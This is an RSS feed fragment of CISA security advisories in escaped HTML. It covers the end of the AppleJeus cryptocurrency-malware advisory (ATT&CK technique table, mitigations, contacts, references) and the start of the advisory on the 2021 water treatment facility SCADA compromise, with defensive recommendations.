			&lt;td scope="col" style="text-align: left;"&gt;&lt;a href="https://attack.mitre.org/versions/v8/tactics/TA0003"&gt;Persistence [TA0003]&lt;/a&gt;&lt;/td&gt;
			&lt;td scope="col" style="text-align: left;"&gt;T1053.004&lt;/td&gt;
			&lt;td scope="col" style="text-align: left;"&gt;Scheduled Task/Job: Launchd&lt;/td&gt;
		&lt;/tr&gt;
		&lt;tr&gt;
			&lt;td scope="col" style="text-align: left;"&gt;&lt;a href="https://attack.mitre.org/versions/v8/tactics/TA0003"&gt;Persistence [TA0003]&lt;/a&gt;&lt;/td&gt;
			&lt;td scope="col" style="text-align: left;"&gt;T1543.004&lt;/td&gt;
			&lt;td scope="col" style="text-align: left;"&gt;Create or Modify System Process: Launch Daemon&lt;/td&gt;
		&lt;/tr&gt;
		&lt;tr&gt;
			&lt;td scope="col" style="text-align: left;"&gt;&lt;a href="https://attack.mitre.org/versions/v8/tactics/TA0003"&gt;Persistence [TA0003]&lt;/a&gt;&lt;/td&gt;
			&lt;td scope="col" style="text-align: left;"&gt;T1547&lt;/td&gt;
			&lt;td scope="col" style="text-align: left;"&gt;Boot or Logon Autostart Execution&lt;/td&gt;
		&lt;/tr&gt;
		&lt;tr&gt;
			&lt;td scope="col" style="text-align: left;"&gt;&lt;a href="https://attack.mitre.org/versions/v8/tactics/TA0004"&gt;Privilege Escalation [TA0004]&lt;/a&gt;&lt;/td&gt;
			&lt;td scope="col" style="text-align: left;"&gt;T1053.005&lt;/td&gt;
			&lt;td scope="col" style="text-align: left;"&gt;Scheduled Task/Job: Scheduled Task&lt;/td&gt;
		&lt;/tr&gt;
		&lt;tr&gt;
			&lt;td scope="col" style="text-align: left;"&gt;&lt;a href="https://attack.mitre.org/versions/v8/tactics/TA0005"&gt;Defense Evasion [TA0005]&lt;/a&gt;&lt;/td&gt;
			&lt;td scope="col" style="text-align: left;"&gt;T1027&lt;/td&gt;
			&lt;td scope="col" style="text-align: left;"&gt;Obfuscated Files or Information&lt;/td&gt;
		&lt;/tr&gt;
		&lt;tr&gt;
			&lt;td scope="col" style="text-align: left;"&gt;&lt;a href="https://attack.mitre.org/versions/v8/tactics/TA0005"&gt;Defense Evasion [TA0005]&lt;/a&gt;&lt;/td&gt;
			&lt;td scope="col" style="text-align: left;"&gt;T1548&lt;/td&gt;
			&lt;td scope="col" style="text-align: left;"&gt;Abuse Elevation Control Mechanism&lt;/td&gt;
		&lt;/tr&gt;
		&lt;tr&gt;
			&lt;td scope="col" style="text-align: left;"&gt;&lt;a href="https://attack.mitre.org/versions/v8/tactics/TA0005"&gt;Defense Evasion [TA0005]&lt;/a&gt;&lt;/td&gt;
			&lt;td scope="col" style="text-align: left;"&gt;T1564.001&lt;/td&gt;
			&lt;td scope="col" style="text-align: left;"&gt;Hide Artifacts: Hidden Files and Directories&lt;/td&gt;
		&lt;/tr&gt;
		&lt;tr&gt;
			&lt;td scope="col" style="text-align: left;"&gt;&lt;a href="https://attack.mitre.org/versions/v8/tactics/TA0007"&gt;Discovery [TA0007]&lt;/a&gt;&lt;/td&gt;
			&lt;td scope="col" style="text-align: left;"&gt;T1033&lt;/td&gt;
			&lt;td scope="col" style="text-align: left;"&gt;System Owner/User Discovery&lt;/td&gt;
		&lt;/tr&gt;
		&lt;tr&gt;
			&lt;td scope="col" style="text-align: left;"&gt;&lt;a href="https://attack.mitre.org/versions/v8/tactics/TA0010"&gt;Exfiltration [TA0010]&lt;/a&gt;&lt;/td&gt;
			&lt;td scope="col" style="text-align: left;"&gt;T1041&lt;/td&gt;
			&lt;td scope="col" style="text-align: left;"&gt;Exfiltration Over C2 Channel&lt;/td&gt;
		&lt;/tr&gt;
		&lt;tr&gt;
			&lt;td scope="col" style="text-align: left;"&gt;&lt;a href="https://attack.mitre.org/versions/v8/tactics/TA0011"&gt;Command and Control [TA0011]&lt;/a&gt;&lt;/td&gt;
			&lt;td scope="col" style="text-align: left;"&gt;T1071.001&lt;/td&gt;
			&lt;td scope="col" style="text-align: left;"&gt;
			&lt;p&gt;Application Layer Protocol: Web Protocols&lt;/p&gt;
			&lt;/td&gt;
		&lt;/tr&gt;
		&lt;tr&gt;
			&lt;td scope="col" style="text-align: left;"&gt;&lt;a href="https://attack.mitre.org/versions/v8/tactics/TA0011"&gt;Command and Control [TA0011]&lt;/a&gt;&lt;/td&gt;
			&lt;td scope="col" style="text-align: left;"&gt;T1573&lt;/td&gt;
			&lt;td scope="col" style="text-align: left;"&gt;Encrypted Channel&lt;/td&gt;
		&lt;/tr&gt;
		&lt;tr&gt;
			&lt;td scope="col" style="text-align: left;"&gt;&lt;a href="https://attack.mitre.org/versions/v8/tactics/TA0011"&gt;Command and Control [TA0011]&lt;/a&gt;&lt;/td&gt;
			&lt;td scope="col" style="text-align: left;"&gt;&lt;span style="font-size:11.0pt;line-height:115%;
font-family:&amp;quot;Arial&amp;quot;,sans-serif;mso-fareast-font-family:Calibri;mso-fareast-theme-font:
minor-latin;mso-bidi-font-family:&amp;quot;Times New Roman&amp;quot;;mso-bidi-theme-font:minor-bidi;
mso-ansi-language:EN-US;mso-fareast-language:EN-US;mso-bidi-language:AR-SA"&gt;T1573.001&lt;/span&gt;&lt;/td&gt;
			&lt;td scope="col" style="text-align: left;"&gt;Encrypted Channel: Symmetric Cryptography&lt;/td&gt;
		&lt;/tr&gt;
	&lt;/tbody&gt;
&lt;/table&gt;
&lt;h3&gt;Mitigations&lt;/h3&gt;&lt;h3&gt;Compromise Mitigations&lt;/h3&gt;

&lt;p&gt;Organizations that identify AppleJeus malware within their networks should take immediate action. Initial actions should include the following steps.&lt;/p&gt;

&lt;ul&gt;
	&lt;li&gt;Contact the FBI, CISA, or Treasury immediately regarding any identified activity related to AppleJeus. (Refer to the Contact Information section below.)&lt;/li&gt;
	&lt;li&gt;Initiate your organization’s incident response plan.&lt;/li&gt;
	&lt;li&gt;Generate new keys for wallets, and/or move to new wallets.&lt;/li&gt;
	&lt;li&gt;Introduce a two-factor authentication solution as an extra layer of verification. &amp;nbsp;&lt;/li&gt;
	&lt;li&gt;Use hardware wallets, which keep the private keys in a separate, secured storage area.&lt;/li&gt;
	&lt;li&gt;To move funds out off a compromised wallet:
	&lt;ul&gt;
		&lt;li&gt;Do not use the malware listed in this advisory to transfer funds, and &amp;nbsp;&lt;/li&gt;
		&lt;li&gt;Form all transactions offline and then broadcast them to the network all at once in a short online session, ideally prior to the attacker accessing them.&lt;/li&gt;
	&lt;/ul&gt;
	&lt;/li&gt;
	&lt;li&gt;Remove impacted hosts from network.&lt;/li&gt;
	&lt;li&gt;Assume the threat actors have moved laterally within the network and downloaded additional malware.&lt;/li&gt;
	&lt;li&gt;Change all passwords to any accounts associated with impacted hosts.&lt;/li&gt;
	&lt;li&gt;Reimage impacted host(s). &amp;nbsp;&lt;/li&gt;
	&lt;li&gt;Install anti-virus software to run daily deep scans of the host.&lt;/li&gt;
	&lt;li&gt;Ensure your anti-virus software is setup to download the latest signatures daily.&lt;/li&gt;
	&lt;li&gt;Install a Host Based Intrusion Detection (HIDS)-based software and keep it up to date.&lt;/li&gt;
	&lt;li&gt;Ensure all software and hardware is up to date, and all patches have been installed.&lt;/li&gt;
	&lt;li&gt;Ensure network-based firewall is installed and/or up to date.&lt;/li&gt;
	&lt;li&gt;Ensure the firewall’s firmware is up to date.&lt;/li&gt;
&lt;/ul&gt;

&lt;h3&gt;Pro-Active Mitigations&lt;/h3&gt;

&lt;p&gt;Consider the following recommendations for defense against AppleJeus malware and related activity.&lt;/p&gt;

&lt;h4&gt;&lt;em&gt;Cryptocurrency Users&lt;/em&gt;&lt;/h4&gt;

&lt;ul&gt;
	&lt;li&gt;Verify source of cryptocurrency-related applications.&lt;/li&gt;
	&lt;li&gt;Use multiple wallets for key storage, striking the appropriate risk balance between hot and cold storage.&lt;/li&gt;
	&lt;li&gt;Use custodial accounts with multi-factor authentication mechanisms for both user and device verification.&lt;/li&gt;
	&lt;li&gt;Patronize cryptocurrency service businesses that offer indemnity protections for lost or stolen cryptocurrency.&lt;/li&gt;
	&lt;li&gt;Consider having a dedicated device for cryptocurrency management.&lt;/li&gt;
&lt;/ul&gt;

&lt;h4&gt;&lt;em&gt;Financial Service Companies&lt;/em&gt;&lt;/h4&gt;

&lt;ul&gt;
	&lt;li&gt;Verify compliance with Federal Financial Institutions Examination Council (FFIEC) handbooks at &lt;a href="https://ithandbook.ffiec.gov/"&gt;https://ithandbook.ffiec.gov&lt;/a&gt;, especially those related to information security.&lt;/li&gt;
	&lt;li&gt;Report suspicious cyber and financial activities. For more information on mandatory and voluntary reporting of cyber events via suspicious activity reports, see the Financial Crimes Enforcement Network (FinCEN) Advisory FIN-2016-A005: Advisory to Financial Institutions on Cyber- Events and Cyber-Enabled Crime at &lt;a href="https://www.fincen.gov/sites/default/files/advisory/2016-10-25/Cyber Threats Advisory - FINAL 508_2.pdf"&gt;https://www.fincen.gov/sites/default/files/advisory/2016-10-25/Cyber%20Threats%20Advisory%20-%20FINAL%20508_2.pdf&lt;/a&gt; and FinCEN’s Section 314(b) Fact Sheet at &lt;a href="https://www.fincen.gov/sites/default/files/shared/314bfactsheet.pdf"&gt;https://www.fincen.gov/sites/default/files/shared/314bfactsheet.pdf&lt;/a&gt;.&lt;/li&gt;
&lt;/ul&gt;

&lt;h4&gt;&lt;em&gt;Cryptocurrency Businesses&lt;/em&gt;&lt;/h4&gt;

&lt;ul&gt;
	&lt;li&gt;Verify compliance with the Cryptocurrency Security Standard at &lt;a href="http://cryptoconsortium.github.io/CCSS/"&gt;http://cryptoconsortium.github.io/CCSS/&lt;/a&gt;.&lt;/li&gt;
&lt;/ul&gt;

&lt;h4&gt;&lt;em&gt;All Organizations&lt;/em&gt;&lt;/h4&gt;

&lt;ul&gt;
	&lt;li&gt;Incorporate IOCs identified in CISA’s Malware Analysis Reports on &lt;a href="https://us-cert.cisa.gov/northkorea"&gt;https://us-cert.cisa.gov/northkorea&lt;/a&gt; into intrusion detection systems and security alert systems to enable active blocking or reporting of suspected malicious activity.&lt;/li&gt;
	&lt;li&gt;See table 3 below, which provides a summary of preventative ATT&amp;amp;CK mitigations based on observed techniques.&lt;/li&gt;
&lt;/ul&gt;

&lt;p class="text-align-center"&gt;&lt;em&gt;Table 3: MITRE ATT&amp;amp;CK mitigations based on observed techniques&lt;/em&gt;&lt;/p&gt;

&lt;table border="1" cellpadding="1" cellspacing="1" class="general-table" style="width: 600px; height: 312px; margin-left: auto; margin-right: auto; "&gt;
	&lt;thead&gt;
		&lt;tr&gt;
			&lt;th scope="col"&gt;&lt;strong&gt;Mitigation&lt;/strong&gt;&lt;/th&gt;
			&lt;th scope="col"&gt;&lt;strong&gt;Description&lt;/strong&gt;&lt;/th&gt;
		&lt;/tr&gt;
	&lt;/thead&gt;
	&lt;tbody&gt;
		&lt;tr&gt;
			&lt;td scope="col" style="text-align: left;"&gt;&lt;a href="https://attack.mitre.org/versions/v8/mitigations/M1017"&gt;User Training [M1017]&lt;/a&gt;&lt;/td&gt;
			&lt;td scope="col" style="text-align: left;"&gt;Train users to identify social engineering techniques and spearphishing emails.&lt;/td&gt;
		&lt;/tr&gt;
		&lt;tr&gt;
			&lt;td scope="col" style="text-align: left;"&gt;&lt;a href="https://attack.mitre.org/versions/v8/mitigations/M1017"&gt;User Training [M1017]&lt;/a&gt;&lt;/td&gt;
			&lt;td scope="col" style="text-align: left;"&gt;Provide users with the awareness of common phishing and spearphishing techniques and raise suspicion for potentially malicious events.&lt;/td&gt;
		&lt;/tr&gt;
		&lt;tr&gt;
			&lt;td scope="col" style="text-align: left;"&gt;&lt;a href="https://attack.mitre.org/versions/v8/mitigations/M1018"&gt;User Account Management [M1018]&lt;/a&gt;&lt;/td&gt;
			&lt;td scope="col" style="text-align: left;"&gt;Limit privileges of user accounts and remediate Privilege Escalation vectors so only authorized administrators can create new Launch Daemons.&lt;/td&gt;
		&lt;/tr&gt;
		&lt;tr&gt;
			&lt;td scope="col" style="text-align: left;"&gt;&lt;a href="https://attack.mitre.org/versions/v8/mitigations/M1018"&gt;User Account Management [M1018]&lt;/a&gt;&lt;/td&gt;
			&lt;td scope="col" style="text-align: left;"&gt;Limit privileges of user accounts and remediate Privilege Escalation vectors so only authorized administrators can create scheduled tasks on remote systems.&lt;/td&gt;
		&lt;/tr&gt;
		&lt;tr&gt;
			&lt;td scope="col" style="text-align: left;"&gt;&lt;a href="https://attack.mitre.org/versions/v8/mitigations/M1020"&gt;SSL/TLS Inspection [M1020]&lt;/a&gt;&lt;/td&gt;
			&lt;td scope="col" style="text-align: left;"&gt;Use SSL/TLS inspection to see encrypted sessions’ contents to look for network-based indicators of malware communication protocols.&lt;/td&gt;
		&lt;/tr&gt;
		&lt;tr&gt;
			&lt;td scope="col" style="text-align: left;"&gt;&lt;a href="https://attack.mitre.org/versions/v8/mitigations/M1021"&gt;Restrict Web-Based Content [M1021]&lt;/a&gt;&lt;/td&gt;
			&lt;td scope="col" style="text-align: left;"&gt;Determine if certain websites that can be used for spearphishing are necessary for business operations and consider blocking access if the activity cannot be monitored well or poses a significant risk.&lt;/td&gt;
		&lt;/tr&gt;
		&lt;tr&gt;
			&lt;td scope="col" style="text-align: left;"&gt;&lt;a href="https://attack.mitre.org/versions/v8/mitigations/M1021"&gt;Restrict Web-Based Content [M1021]&lt;/a&gt;&lt;/td&gt;
			&lt;td scope="col" style="text-align: left;"&gt;Block Script extensions to prevent the execution of scripts and HTA files that may commonly be used during the exploitation process.&lt;/td&gt;
		&lt;/tr&gt;
		&lt;tr&gt;
			&lt;td scope="col" style="text-align: left;"&gt;&lt;a href="https://attack.mitre.org/versions/v8/mitigations/M1021"&gt;Restrict Web-Based Content [M1021]&lt;/a&gt;&lt;/td&gt;
			&lt;td scope="col" style="text-align: left;"&gt;Employ an adblocker to prevent malicious code served up through ads from executing.&lt;/td&gt;
		&lt;/tr&gt;
		&lt;tr&gt;
			&lt;td scope="col" style="text-align: left;"&gt;&lt;a href="https://attack.mitre.org/versions/v8/mitigations/M1022"&gt;Restrict File and Directory Permissions [M1022]&lt;/a&gt;&lt;/td&gt;
			&lt;td scope="col" style="text-align: left;"&gt;Prevent all users from writing to the &lt;code&gt;/Library/StartupItems &lt;/code&gt;directory to prevent any startup items from getting registered since &lt;code&gt;StartupItems&lt;/code&gt; are deprecated.&lt;/td&gt;
		&lt;/tr&gt;
		&lt;tr&gt;
			&lt;td scope="col" style="text-align: left;"&gt;&lt;a href="https://attack.mitre.org/versions/v8/mitigations/M1026"&gt;Privileged Account Management [M1026]&lt;/a&gt;&lt;/td&gt;
			&lt;td scope="col" style="text-align: left;"&gt;When PowerShell is necessary, restrict PowerShell execution policy to administrators. Be aware that there are methods of bypassing the PowerShell execution policy, depending on environment configuration.&lt;/td&gt;
		&lt;/tr&gt;
		&lt;tr&gt;
			&lt;td scope="col" style="text-align: left;"&gt;&lt;a href="https://attack.mitre.org/versions/v8/mitigations/M1026"&gt;Privileged Account Management [M1026]&lt;/a&gt;&lt;/td&gt;
			&lt;td scope="col" style="text-align: left;"&gt;Configure the Increase Scheduling Priority option only to allow the Administrators group the rights to schedule a priority process.&lt;/td&gt;
		&lt;/tr&gt;
		&lt;tr&gt;
			&lt;td scope="col" style="text-align: left;"&gt;&lt;a href="https://attack.mitre.org/versions/v8/mitigations/M1028"&gt;Operating System Configuration [M1028]&lt;/a&gt;&lt;/td&gt;
			&lt;td scope="col" style="text-align: left;"&gt;Configure settings for scheduled tasks to force tasks to run under the authenticated account’s context instead of allowing them to run as SYSTEM.&lt;/td&gt;
		&lt;/tr&gt;
		&lt;tr&gt;
			&lt;td scope="col" style="text-align: left;"&gt;&lt;a href="https://attack.mitre.org/versions/v8/mitigations/M1031"&gt;Network Intrusion Prevention [M1031]&lt;/a&gt;&lt;/td&gt;
			&lt;td scope="col" style="text-align: left;"&gt;Use network intrusion detection and prevention systems that use network signatures to identify traffic for specific adversary malware and mitigate activity at the network level.&lt;/td&gt;
		&lt;/tr&gt;
		&lt;tr&gt;
			&lt;td scope="col" style="text-align: left;"&gt;&lt;a href="https://attack.mitre.org/versions/v8/mitigations/M1038"&gt;Execution Prevention [M1038]&lt;/a&gt;&lt;/td&gt;
			&lt;td scope="col" style="text-align: left;"&gt;Use application control tools where appropriate.&lt;/td&gt;
		&lt;/tr&gt;
		&lt;tr&gt;
			&lt;td scope="col" style="text-align: left;"&gt;&lt;a href="https://attack.mitre.org/versions/v8/mitigations/M1038"&gt;Execution Prevention [M1038]&lt;/a&gt;&lt;/td&gt;
			&lt;td scope="col" style="text-align: left;"&gt;Use application control tools to prevent the running of executables masquerading as other files.&lt;/td&gt;
		&lt;/tr&gt;
		&lt;tr&gt;
			&lt;td scope="col" style="text-align: left;"&gt;&lt;a href="https://attack.mitre.org/versions/v8/mitigations/M1040"&gt;Behavior Prevention on Endpoint [M1040]&lt;/a&gt;&lt;/td&gt;
			&lt;td scope="col" style="text-align: left;"&gt;Configure endpoint (if possible) to block some process injection types based on common sequences of behavior during the injection process.&lt;/td&gt;
		&lt;/tr&gt;
		&lt;tr&gt;
			&lt;td scope="col" style="text-align: left;"&gt;&lt;a href="https://attack.mitre.org/versions/v8/mitigations/M1042"&gt;Disable or Remove Feature or Program [M1042]&lt;/a&gt;&lt;/td&gt;
			&lt;td scope="col" style="text-align: left;"&gt;Disable or remove any unnecessary or unused shells or interpreters.&lt;/td&gt;
		&lt;/tr&gt;
		&lt;tr&gt;
			&lt;td scope="col" style="text-align: left;"&gt;&lt;a href="https://attack.mitre.org/versions/v8/mitigations/M1045"&gt;Code Signing [M1045]&lt;/a&gt;&lt;/td&gt;
			&lt;td scope="col" style="text-align: left;"&gt;Where possible, only permit the execution of signed scripts.&lt;/td&gt;
		&lt;/tr&gt;
		&lt;tr&gt;
			&lt;td scope="col" style="text-align: left;"&gt;&lt;a href="https://attack.mitre.org/versions/v8/mitigations/M1047"&gt;Audit [M1047]&lt;/a&gt;&lt;/td&gt;
			&lt;td scope="col" style="text-align: left;"&gt;Audit logging for &lt;code&gt;launchd&lt;/code&gt; events in macOS can be reviewed or centrally collected using multiple options, such as Syslog, OpenBSM, or OSquery.&lt;/td&gt;
		&lt;/tr&gt;
		&lt;tr&gt;
			&lt;td scope="col" style="text-align: left;"&gt;&lt;a href="https://attack.mitre.org/versions/v8/mitigations/M1047"&gt;Audit [M1047]&lt;/a&gt;&lt;/td&gt;
			&lt;td scope="col" style="text-align: left;"&gt;Toolkits like the PowerSploit framework contain PowerUp modules that can be used to explore systems for permission weaknesses in scheduled tasks that could be used to escalate privileges.&lt;/td&gt;
		&lt;/tr&gt;
		&lt;tr&gt;
			&lt;td scope="col" style="text-align: left;"&gt;&lt;a href="https://us-cert.cisa.govAntivirus/Antimalware [M1049]"&gt;Antivirus/Antimalware [M1049]&lt;/a&gt;&lt;/td&gt;
			&lt;td scope="col" style="text-align: left;"&gt;Use an antivirus program to quarantine suspicious files automatically.&lt;/td&gt;
		&lt;/tr&gt;
	&lt;/tbody&gt;
&lt;/table&gt;

&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;h3&gt;Contact Information&lt;/h3&gt;&lt;p&gt;Recipients of this report are encouraged to contribute any additional information that they may have related to this threat.&lt;/p&gt;

&lt;p&gt;For any questions related to this report or to report an intrusion and request resources for incident response or technical assistance, please contact:&lt;/p&gt;

&lt;ul&gt;
	&lt;li&gt;The FBI through the FBI Cyber Division (855-292-3937 or &lt;a href="https://us-cert.cisa.govmailto:CyWatch@fbi.gov"&gt;CyWatch@fbi.gov&lt;/a&gt;) or a &lt;a href="https://www.fbi.gov/contact-us/field-offices/field-offices"&gt;local field office&lt;/a&gt;,&lt;/li&gt;
	&lt;li&gt;CISA (888-282-0870 or &lt;a href="https://us-cert.cisa.govmailto:Central@cisa.dhs.gov"&gt;Central@cisa.dhs.gov&lt;/a&gt;), or&lt;/li&gt;
	&lt;li&gt;Treasury Office of Cybersecurity and Critical Infrastructure Protection (Treasury OCCIP) (202-622-3000 or &lt;a href="https://us-cert.cisa.govmailto:OCCIP-Coord@treasury.gov"&gt;OCCIP-Coord@treasury.gov&lt;/a&gt;).&lt;/li&gt;
&lt;/ul&gt;
                    &lt;h3&gt;References&lt;/h3&gt;
		        &lt;ul&gt;		            	&lt;li&gt;&lt;a href="https://us-cert.cisa.gov/ncas/alerts/aa20-239a"&gt;[1] CISA Alert AA20-239A: FASTCash 2.0: North Korea's BeagleBoyz Robbing Banks&lt;/a&gt;&lt;/li&gt;		            	&lt;li&gt;&lt;a href="https://home.treasury.gov/news/press-releases/sm924"&gt;[2] Department of the Treasury Press Release: Treasury Sanctions Individuals Laundering Cryptocurrency for Lazarus Group&lt;/a&gt;&lt;/li&gt;		            	&lt;li&gt;&lt;a href="https://www.justice.gov/opa/pr/two-chinese-nationals-charged-laundering-over-100-million-cryptocurrency-exchange-hack"&gt;[3] Department of Justice Press Release: Two Chinese Nationals Charged with Laundering Over $100 Million in Cryptocurrency From Exchange Hack&lt;/a&gt;&lt;/li&gt;		            	&lt;li&gt;&lt;a href="https://us-cert.cisa.gov/ncas/alerts/TA17-318A"&gt;[4] CISA Alert TA17-318A: HIDDEN COBRA – North Korean Remote Administration Tool: FALLCHILL&lt;/a&gt;&lt;/li&gt;		            	&lt;li&gt;&lt;a href="https://us-cert.cisa.gov/ncas/alerts/TA17-318A"&gt;[5] CISA Alert TA17-318A: HIDDEN COBRA – North Korean Remote Administration Tool: FALLCHILL &lt;/a&gt;&lt;/li&gt;		            	&lt;li&gt;&lt;a href="https://attack.mitre.org/versions/v8/software/S0181/"&gt;[6] MITRE ATT&amp;CK Software: FALLCHILL&lt;/a&gt;&lt;/li&gt;		            	&lt;li&gt;&lt;a href="https://securelist.com/operation-applejeus-sequel/95596/"&gt;[7] SecureList: Operation AppleJeus Sequel&lt;/a&gt;&lt;/li&gt;		            	&lt;li&gt;&lt;a href="https://github.com/butor/blackbird"&gt;[8] GitHub: Blackbird Bitcoin Arbitrage&lt;/a&gt;&lt;/li&gt;		        &lt;/ul&gt;            &lt;h3&gt;Revisions&lt;/h3&gt;
		&lt;ul&gt;			            &lt;li&gt;February 17, 2021: Initial Version&lt;/li&gt;			            &lt;li&gt;April 15, 2021: Updated MITRE ATT&amp;CK technique from Command and Scripting Interpreter: AppleScript [T1059.002] to Command and Scripting Interpreter: Unix Shell [T1059.004]. &lt;/li&gt;		&lt;/ul&gt;
		&lt;hr /&gt;
            &lt;div class="field field--name-body field--type-text-with-summary field--label-hidden field--item"&gt;&lt;p class="privacy-and-terms"&gt;This product is provided subject to this &lt;a href="https://us-cert.cisa.gov/privacy/notification"&gt;Notification&lt;/a&gt; and this &lt;a href="https://www.dhs.gov/privacy-policy"&gt;Privacy &amp;amp; Use&lt;/a&gt; policy.&lt;/p&gt;
&lt;/div&gt;
      </description>
  <pubDate>Wed, 17 Feb 2021 16:00:00 +0000</pubDate>
    <dc:creator>CISA</dc:creator>
    <guid isPermaLink="false">16191 at https://us-cert.cisa.gov</guid>
    </item>
<item>
	<title>AA21-042A: Compromise of U.S. Water Treatment Facility </title>
	<link>https://us-cert.cisa.gov/ncas/alerts/aa21-042a</link>
	<description>Original release date: February 11, 2021 | Last revised: February 12, 2021&lt;br/&gt;&lt;h3&gt;Summary&lt;/h3&gt;&lt;p&gt;On February 5, 2021, unidentified cyber actors obtained unauthorized access to the supervisory control and data acquisition (SCADA) system at a U.S. drinking water treatment facility. The unidentified actors used the SCADA system’s software to increase the amount of sodium hydroxide, also known as lye, a caustic chemical, as part of the water treatment process. Water treatment plant personnel immediately noticed the change in dosing amounts and corrected the issue before the SCADA system’s software detected the manipulation and alarmed due to the unauthorized change. As a result, the water treatment process remained unaffected and continued to operate as normal. The cyber actors likely accessed the system by exploiting cybersecurity weaknesses, including poor password security, and an outdated operating system. Early information indicates it is possible that a&amp;nbsp;desktop sharing software, such as TeamViewer, may have been used to gain unauthorized access to the system, although this cannot be confirmed at present date. Onsite response to the incident included Pinellas County Sheriff Office (PCSO), U.S. Secret Service (USSS), and the Federal Bureau of Investigation (FBI).&lt;/p&gt;

&lt;p&gt;The FBI, the Cybersecurity and Infrastructure Security Agency (CISA), the Environmental Protection Agency (EPA), and the Multi-State Information Sharing and Analysis Center (MS-ISAC)&lt;span style="font-size:11.0pt"&gt;&lt;span style="line-height:115%"&gt;&lt;span style="font-family:&amp;quot;Arial&amp;quot;,sans-serif"&gt;&amp;nbsp;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;have observed cyber criminals targeting and exploiting desktop sharing software and computer networks running operating systems with end of life status to gain unauthorized access to systems. Desktop sharing software, which has multiple legitimate uses—such as enabling telework, remote technical support, and file transfers—can also be exploited through malicious actors’ use of social engineering tactics and other illicit measures. Windows 7 will become more susceptible to exploitation due to lack of security updates and the discovery of new vulnerabilities. Microsoft and other industry professionals strongly recommend upgrading computer systems to an actively supported operating system. Continuing to use any operating system within an enterprise beyond the end of life status may provide cyber criminals access into computer systems.&lt;/p&gt;

&lt;p&gt;&lt;a href="https://us-cert.cisa.gov/sites/default/files/publications/AA21-042A_Joint_Cybersecurity_Advisory_Compromise_of_U.S._Drinking_Treatment_Facility.pdf"&gt;Click here&lt;/a&gt;&amp;nbsp;for a PDF version of this report.&lt;/p&gt;
&lt;h3&gt;Technical Details&lt;/h3&gt;&lt;h3&gt;Desktop Sharing Software&lt;/h3&gt;

&lt;p&gt;The FBI, CISA, EPA, and MS-ISAC have observed corrupt insiders and outside cyber actors using desktop sharing software to victimize targets in a range of organizations, including those in the critical infrastructure sectors. In addition to adjusting system operations, cyber actors also use the following techniques:&lt;/p&gt;

&lt;ul&gt;
	&lt;li&gt;Use access granted by desktop sharing software to perform fraudulent wire transfers.&lt;/li&gt;
	&lt;li&gt;Inject malicious code that allows the cyber actors to
	&lt;ul&gt;
		&lt;li&gt;Hide desktop sharing software windows,&lt;/li&gt;
		&lt;li&gt;Protect malicious files from being detected, and&lt;/li&gt;
		&lt;li&gt;Control desktop sharing software startup parameters to obfuscate their activity.&lt;/li&gt;
	&lt;/ul&gt;
	&lt;/li&gt;
	&lt;li&gt;Move laterally across a network to increase the scope of activity.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;TeamViewer, a desktop sharing software, is a legitimate popular tool that has been exploited by cyber actors engaged in targeted social engineering attacks, as well as large scale, indiscriminate phishing campaigns. Desktop sharing software can also be used by employees with vindictive and/or larcenous motivations against employers.&lt;/p&gt;

&lt;p&gt;Beyond its legitimate uses, when proper security measures aren’t followed, remote access tools may be used to exercise remote control over computer systems and drop files onto victim computers, making it functionally similar to Remote Access Trojans (RATs). TeamViewer’s legitimate use, however, makes anomalous activity less suspicious to end users and system administrators compared to RATs.&lt;/p&gt;

&lt;h3&gt;Windows 7 End of Life&lt;/h3&gt;

&lt;p&gt;On January 14, 2020, Microsoft ended support for the Windows 7 operating system, which includes security updates and technical support unless certain customers purchased an Extended Security Update (ESU) plan. The ESU plan is paid per-device and available for Windows 7 Professional and Enterprise versions, with an increasing price the longer a customer continues use. Microsoft will only offer the ESU plan until January 2023. Continued use of Windows 7 increases the risk of cyber actor exploitation of a computer system.&lt;/p&gt;

&lt;p&gt;Cyber actors continue to find entry points into legacy Windows operating systems and leverage Remote Desktop Protocol (RDP) exploits. Microsoft released an emergency patch for its older operating systems, including Windows 7, after an information security researcher discovered an RDP vulnerability in May 2019. Since the end of July 2019, malicious RDP activity has increased with the development of a working commercial exploit for the vulnerability. Cyber actors often use misconfigured or improperly secured RDP access controls to conduct cyberattacks. The xDedic Marketplace, taken down by law enforcement in 2019, flourished by compromising RDP vulnerabilities around the world.&lt;/p&gt;
&lt;h3&gt;Mitigations&lt;/h3&gt;&lt;h3&gt;General Recommendations&lt;/h3&gt;

&lt;p&gt;The following cyber hygiene measures may help protect against the aforementioned scheme:&lt;/p&gt;

&lt;ul&gt;
	&lt;li&gt;Update to the latest version of the operating system (e.g., Windows 10).&lt;/li&gt;
	&lt;li&gt;Use multiple-factor authentication.&lt;/li&gt;
	&lt;li&gt;Use strong passwords to protect Remote Desktop Protocol (RDP) credentials.&lt;/li&gt;
	&lt;li&gt;Ensure anti-virus, spam filters, and firewalls are up to date, properly configured, and secure.&lt;/li&gt;
	&lt;li&gt;Audit network configurations and isolate computer systems that cannot be updated.&lt;/li&gt;
	&lt;li&gt;Audit your network for systems using RDP, closing unused RDP ports, applying multiple-factor authentication wherever possible, and logging RDP login attempts.&lt;/li&gt;
	&lt;li&gt;Audit logs for all remote connection protocols.&lt;/li&gt;
	&lt;li&gt;Train users to identify and report attempts at social engineering.&lt;/li&gt;
	&lt;li&gt;Identify and suspend access of users exhibiting unusual activity.&lt;/li&gt;
&lt;/ul&gt;

&lt;h3&gt;Water and Wastewater Systems Security Recommendations&lt;/h3&gt;

&lt;p&gt;The following physical security measures serve as additional protective measures:&lt;/p&gt;

&lt;ul&gt;
	&lt;li&gt;Install independent cyber-physical safety systems. These are systems that physically prevent dangerous conditions from occurring if the control system is compromised by a threat actor.&lt;/li&gt;
	&lt;li&gt;Examples of cyber-physical safety system controls include:
	&lt;ul&gt;
		&lt;li&gt;Size of the chemical pump&lt;/li&gt;
		&lt;li&gt;Size of the chemical reservoir&lt;/li&gt;
		&lt;li&gt;Gearing on valves&lt;/li&gt;
		&lt;li&gt;Pressure switches, etc.&lt;/li&gt;
	&lt;/ul&gt;
	&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;The benefit of these types of controls in the water sector is that smaller systems, with limited cybersecurity capability, can assess their system from a worst-case scenario. The operators can take physical steps to limit the damage. If, for example, cyber actors gain control of a sodium hydroxide pump, they will be unable to raise the pH to dangerous levels.&lt;/p&gt;

